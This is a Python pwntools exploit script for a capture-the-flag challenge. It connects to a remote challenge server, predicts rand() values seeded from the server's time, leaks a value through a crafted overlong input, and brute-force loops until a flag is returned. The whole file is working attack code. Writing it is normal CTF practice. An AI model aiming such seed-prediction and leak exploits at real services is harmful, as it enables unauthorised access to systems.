from pwn import *
import ctypes
import warnings
import time
context.log_level ="debug"
elf = context.binary = ELF("./source")
context.binary = elf
r = elf.process()

def GDB():
    gdb.attach(r, '''
        b* main + 43\n
        b* Advanced_Magic+296 \n
        b* Advanced_Magic+351 \n
        b* Advanced_Magic+398 \n
        c
    ''')
x=0
### Stage 1 ###
context.log_level = 'critical'
while(1):
    try:
        ########## STAGE 1 ###########
        r = remote("34.126.117.161", 2000)
        # r = remote("0.0.0.0", 2000)
        r.recvline()
        seed = int(r.recvline(),10)
        log.success(f"SEED: {seed}")
        libc = ctypes.CDLL("libc.so.6")
        libc.srand(seed)
        sleep(1)
        ran_num = libc.rand()
        time_ran = seed
        log.success("Random number: " + hex(ran_num))
        log.success("Time random:" + hex(time_ran))
        random_number = (ran_num ^ time_ran ^ 0xDEADBEEFDEADC0DE) - 0xffffffffffffffff
        log.success("Random after calc: " + hex(random_number))
        r.send(b"\n")
        r.sendline(str(random_number))

        ######### STAGE 2 ###########
        r.send(b"\n")
        payload = b"1" * 30 + b"||"
        r.send(payload)
        r.recvuntil(b"|")

        v5 = u64(r.recv(8))
        log.success(f"V5: {hex(v5)}")
        r.recvuntil(b"\x1B[1A\x1B[K")
        seed = libc.time(0)
        log.success(f"TIME: {hex(seed)}")
        libc.srand(seed)
        v6 = libc.rand()
        log.success(f"V6: {hex(v6)}")

        if(v5 > 0x7fffffffffffffff):
                magic_num = (v6 ^ v5 ^ 0xDEADBEEFDEADC0DE)
        else:
                magic_num = (v6 ^ v5 ^ 0xDEADBEEFDEADC0DE) - 0xfffffffffffffffe
        log.success("Magic number: " + hex(magic_num))
        r.sendline(str(magic_num))
        output = r.recvall(timeout = 1)
        print(output)
        x+=1
        if b"ISITDTU{" in output: 
                print(output)
                break
    except:
        r.close()
    print(x, end = "\r")
r.interactive()